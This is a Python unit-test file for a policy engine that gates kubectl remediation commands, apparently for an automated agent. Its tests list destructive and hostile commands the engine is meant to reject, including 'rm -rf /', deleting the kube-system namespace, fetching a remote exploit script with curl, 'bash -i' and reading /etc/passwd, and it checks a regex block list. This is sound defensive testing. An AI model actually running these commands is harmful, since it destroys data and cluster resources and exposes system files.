"""
Unit Tests for Remediation Policy Engine — KDM v4.0.0
=====================================================
Validates security policy rules:
- Deterministic regex rejection of destructive commands & dangerous flags.
- Whitelist enforcement for safe kubectl mutations.
- Rejection of unauthorized non-whitelisted commands.
"""

from __future__ import annotations

import os
import sys
import unittest

_REPO_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), "../.."))
if _REPO_ROOT not in sys.path:
    sys.path.insert(0, _REPO_ROOT)

_AGENTS_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
if _AGENTS_DIR not in sys.path:
    sys.path.insert(0, _AGENTS_DIR)

try:
    from agents.remediation.policy import (
        ALLOWED_COMMAND_PREFIXES,
        BLOCKED_PATTERNS,
        PolicyEngine,
    )
except ImportError:
    from remediation.policy import (  # type: ignore[no-redef]
        ALLOWED_COMMAND_PREFIXES,
        BLOCKED_PATTERNS,
        PolicyEngine,
    )



class TestPolicyEngine(unittest.TestCase):
    """Test suite for PolicyEngine security gating and command validation."""

    def setUp(self) -> None:
        """Initialize a standard PolicyEngine instance for tests."""
        self.engine = PolicyEngine()

    def _assert_rejected(self, command: str) -> None:
        """Helper to assert that a command is rejected by the policy engine."""
        self.assertFalse(
            self.engine.evaluate(command),
            f"Expected command to be rejected: {command}",
        )

    def _assert_approved(self, command: str) -> None:
        """Helper to assert that a command is approved by the policy engine."""
        self.assertTrue(
            self.engine.evaluate(command),
            f"Expected command to be approved: {command}",
        )

    def test_blocked_delete_namespace_command(self) -> None:
        """Ensure deletion of namespaces is permanently blocked."""
        commands = [
            "kubectl delete namespace kube-system",
            "kubectl delete namespace default",
            "kubectl delete   namespace   production",
            "kubectl delete\tnamespace\tmonitoring",
        ]
        for cmd in commands:
            self._assert_rejected(cmd)

    def test_blocked_delete_node_command(self) -> None:
        """Ensure deletion of cluster nodes is permanently blocked."""
        commands = [
            "kubectl delete node worker-1",
            "kubectl delete node k8s-master",
            "kubectl delete   node   minikube",
        ]
        for cmd in commands:
            self._assert_rejected(cmd)

    def test_blocked_rm_rf_command(self) -> None:
        """Ensure dangerous shell file deletion commands are blocked."""
        commands = [
            "rm -rf /",
            "rm -rf /var/log/pods",
            "kubectl scale deployment api --replicas=1 && rm -rf /",
            "kubectl patch deployment web -p '{}' ; rm -rf .",
        ]
        for cmd in commands:
            self._assert_rejected(cmd)

    def test_blocked_dangerous_options(self) -> None:
        """Ensure dangerous options such as --force and --grace-period=0 are blocked."""
        commands = [
            "kubectl delete pod api --force --grace-period=0",
            "kubectl delete pod api --force",
            "kubectl delete pod api --grace-period=0",
            "kubectl scale deployment api --replicas=0 --force",
            "kubectl patch deployment api -p '{\"spec\":{}}' --force",
            "kubectl rollout restart deployment api --grace-period=0",
            "kubectl set resources deployment api --limits=memory=512Mi --force",
        ]
        for cmd in commands:
            self._assert_rejected(cmd)

    def test_valid_whitelisted_commands(self) -> None:
        """Ensure authorized cluster remediation commands with valid prefixes pass."""
        commands = [
            "kubectl set resources deployment checkout-api --limits=memory=512Mi",
            "kubectl set resources deployment api --requests=cpu=100m,memory=256Mi",
            "kubectl scale deployment checkout-api --replicas=3",
            "kubectl scale statefulset database --replicas=1",
            "kubectl rollout restart deployment checkout-api",
            "kubectl rollout restart daemonset fluentd -n kube-system",
            "kubectl patch deployment web --type merge -p '{\"spec\":{\"replicas\":2}}'",
            "kubectl patch statefulset redis -p '{\"spec\":{\"template\":{}}}'",
        ]
        for cmd in commands:
            self._assert_approved(cmd)

    def test_unapproved_prefixes_rejected(self) -> None:
        """Ensure commands lacking approved prefixes are rejected even if not explicitly blacklisted."""
        commands = [
            "kubectl get pods -A",
            "kubectl describe node worker-1",
            "kubectl exec -it pod -- /bin/bash",
            "curl -s https://example.com/exploit.sh",
            "python3 -c 'import os; os.system(\"rm -rf /\")'",
            "bash -i",
            "cat /etc/passwd",
        ]
        for cmd in commands:
            self._assert_rejected(cmd)

    def test_empty_and_invalid_inputs(self) -> None:
        """Ensure empty, whitespace, and non-string inputs are safely rejected."""
        self._assert_rejected("")
        self._assert_rejected("   ")
        self._assert_rejected("\t\n")
        self.assertFalse(self.engine.evaluate(None))  # type: ignore[arg-type]
        self.assertFalse(self.engine.evaluate(12345))  # type: ignore[arg-type]

    def test_evaluate_with_reason(self) -> None:
        """Ensure evaluate_with_reason provides accurate failure diagnostic reasons."""
        approved, reason = self.engine.evaluate_with_reason(
            "kubectl set resources deployment checkout-api --limits=memory=512Mi"
        )
        self.assertTrue(approved)
        self.assertIsNone(reason)

        blocked, reason = self.engine.evaluate_with_reason("kubectl delete namespace kube-system")
        self.assertFalse(blocked)
        self.assertEqual(reason, "Command matches a blocked destructive pattern")

        unapproved, reason = self.engine.evaluate_with_reason("kubectl get nodes")
        self.assertFalse(unapproved)
        self.assertEqual(reason, "Command does not begin with an authorized prefix")

        empty, reason = self.engine.evaluate_with_reason("")
        self.assertFalse(empty)
        self.assertEqual(reason, "Command must be a non-empty string")

    def test_custom_policy_engine_rules(self) -> None:
        """Ensure PolicyEngine supports customizable blocked patterns and allowed prefixes."""
        custom_engine = PolicyEngine(
            blocked_patterns=[r"\bcustom_dangerous\b"],
            allowed_prefixes=["kdm test"],
        )
        self.assertTrue(custom_engine.evaluate("kdm test run-remediation"))
        self.assertFalse(custom_engine.evaluate("kdm test custom_dangerous action"))
        self.assertFalse(custom_engine.evaluate("kubectl scale deployment test"))

    def test_constants_and_exports(self) -> None:
        """Verify standard blocked patterns and whitelist constants are present."""
        self.assertIn(r"\bdelete\s+namespace\b", BLOCKED_PATTERNS)
        self.assertIn(r"\bdelete\s+node\b", BLOCKED_PATTERNS)
        self.assertIn(r"\brm\s+-rf\b", BLOCKED_PATTERNS)
        self.assertIn(r"\b--force\b", BLOCKED_PATTERNS)
        self.assertIn(r"\b--grace-period=0\b", BLOCKED_PATTERNS)

        self.assertIn("kubectl set resources", ALLOWED_COMMAND_PREFIXES)
        self.assertIn("kubectl scale", ALLOWED_COMMAND_PREFIXES)
        self.assertIn("kubectl rollout restart", ALLOWED_COMMAND_PREFIXES)
        self.assertIn("kubectl patch", ALLOWED_COMMAND_PREFIXES)


if __name__ == "__main__":
    unittest.main()
